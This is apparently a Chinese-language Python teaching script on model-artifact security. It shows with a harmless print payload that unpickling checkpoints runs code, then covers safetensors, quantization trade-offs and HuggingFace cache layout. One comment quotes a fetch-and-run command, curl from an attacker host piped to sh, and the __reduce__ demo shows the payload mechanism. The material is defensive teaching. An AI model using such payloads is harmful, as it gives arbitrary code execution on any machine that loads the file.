"""阶段四 4.3 —— 模型工件层：为什么 infra 侧必须禁止加载不可信的 pickle。

这不是理论风险。`.bin` / `.pt` / `.ckpt` 本质是 pickle，
**反序列化就等于执行代码** —— 下面几行就能证明，无害地。
"""
from __future__ import annotations

import json
import os
import pickle
import struct
import tempfile
from pathlib import Path

# ── 1. pickle 的反序列化 = 任意代码执行 ──────────────────────────────
class InnocentLookingCheckpoint:
    """看起来就是个普通的权重字典。"""

    def __reduce__(self):
        # 这个魔法方法告诉 pickle "怎么重建我"。攻击者写什么，机器就执行什么。
        # 真实攻击会写 os.system("curl attacker/x.sh | sh")；这里只是打印。
        return (print, ("   ☠️  [payload] 我在 torch.load() 的那一刻就运行了",))


blob = pickle.dumps(InnocentLookingCheckpoint())
print("1. 一个 %d 字节的 '权重文件'。现在'加载'它：" % len(blob))
pickle.loads(blob)          # ← 等价于 torch.load(f)，weights_only=False 时
print("   → 注意：我们一次都没有调用那个类的方法，只是反序列化。\n")

print("   防御（三条都要做）：")
print("   a) torch.load(..., weights_only=True)   PyTorch 2.6 起是**默认值**")
print("   b) 只接受 .safetensors，CI 里拒绝 .bin/.pt/.ckpt 进入制品库")
print("   c) 模型仓库做校验和固定 + 来源白名单（和你管 Maven 私服是一回事）\n")

# ── 2. safetensors 为什么安全：它根本不是可执行格式 ──────────────────
print("2. safetensors 的文件结构（手写一个，8 行就够）")


def write_safetensors(path: Path, tensors: dict[str, list[float]]) -> None:
    """格式：[8 字节头长度][JSON 头][紧接着的原始字节]。没有代码，只有数据。"""
    header, payload, offset = {}, bytearray(), 0
    for name, values in tensors.items():
        raw = struct.pack(f"<{len(values)}f", *values)
        header[name] = {"dtype": "F32", "shape": [len(values)],
                        "data_offsets": [offset, offset + len(raw)]}
        payload += raw
        offset += len(raw)
    head = json.dumps(header).encode()
    head += b" " * ((8 - len(head) % 8) % 8)           # 对齐到 8 字节
    path.write_bytes(struct.pack("<Q", len(head)) + head + bytes(payload))


def read_header(path: Path) -> dict:
    """★ 关键：只读头就能知道有哪些张量、多大 —— 不用把权重读进内存。"""
    with path.open("rb") as f:
        n = struct.unpack("<Q", f.read(8))[0]
        return json.loads(f.read(n))


with tempfile.TemporaryDirectory() as d:
    p = Path(d) / "model.safetensors"
    write_safetensors(p, {"layer0.weight": [1.0, 2.0, 3.0, 4.0],
                          "layer0.bias": [0.1, 0.2]})
    print(f"   文件 {p.stat().st_size} 字节")
    print(f"   只读头拿到的元信息：{json.dumps(read_header(p), ensure_ascii=False)}")
    print("   → 这就是 safetensors 的三个优点：")
    print("     · 无代码执行面（纯数据）")
    print("     · 零拷贝 mmap（加载 70B 不需要先把它读进 RAM）")
    print("     · 读头就能拿到 shape/dtype 清单（做校验、做分片规划都靠它）\n")

# ── 3. 量化：省的是什么，代价是什么 ─────────────────────────────────
print("3. 量化方案速查（infra 侧要能回答的三个问题：省多少 / 掉多少 / 哪种卡有加速）")
rows = [
    # 方案,       权重字节, 典型显存比, 质量损失, 硬件加速,        适用场景
    ("bf16 基线",  2.0, "100%", "—",        "全部",             "默认，质量优先"),
    ("fp8 (W8A8)", 1.0, " 50%", "极小",     "H100/H200/Ada+",   "有新卡时的首选"),
    ("int8 (W8A8)",1.0, " 50%", "很小",     "Ampere+",          "A100/A10G 上的实用档"),
    ("AWQ int4",   0.5, " 25%", "小",       "Ampere+ (反量化)", "显存紧张、批量小"),
    ("GPTQ int4",  0.5, " 25%", "小~中",    "Ampere+",          "同上，工具链更老"),
    ("GGUF Qx",    0.5, " 25%", "看档位",   "CPU/Metal 为主",   "本地/边缘，不是数据中心"),
]
print(f"   {'方案':<12}{'字节/参数':>9}{'显存':>7}{'质量损失':>9}  {'硬件':<18}{'适用'}")
for name, b, mem, loss, hw, use in rows:
    print(f"   {name:<14}{b:>7.1f}{mem:>8}{loss:>10}  {hw:<20}{use}")
print("""
   ⚠️ 三个最常见的误解：
   · 「int4 能让吞吐翻 4 倍」—— 不会。decode 阶段是**访存**瓶颈，
     权重小了确实有帮助，但 KV 缓存没变小，批量大时收益迅速衰减。
   · 「量化只看显存」—— 还要看这张卡有没有对应精度的**张量核心指令**。
     在 A100 上跑 fp8 要靠软件模拟，可能反而更慢。
   · 「掉点很小所以随便用」—— 掉点在长尾任务（代码、数学、多语言）上放大得最厉害，
     必须用你**自己的**评测集测过再上线（这正是任务 #423 那套评测平台的用处）。""".rstrip())

# ── 4. HF 缓存布局：部署时一定会踩的运维细节 ────────────────────────
print(f"""
4. HuggingFace 缓存（容器化部署必须处理）
   HF_HOME={os.environ.get('HF_HOME', '(未设置，默认 ~/.cache/huggingface)')}
   目录结构：$HF_HOME/hub/models--<org>--<name>/snapshots/<commit>/*.safetensors
   三条实践：
   · 把 HF_HOME 挂到**共享持久卷**，否则每个 Pod 都要重新下 15 GB
   · 镜像里**不要**打包权重（镜像会变成几十 GB，拉取就是冷启动灾难）
   · 用 commit sha 而不是分支名固定版本 —— 等价于你锁 Maven 版本号""".rstrip())
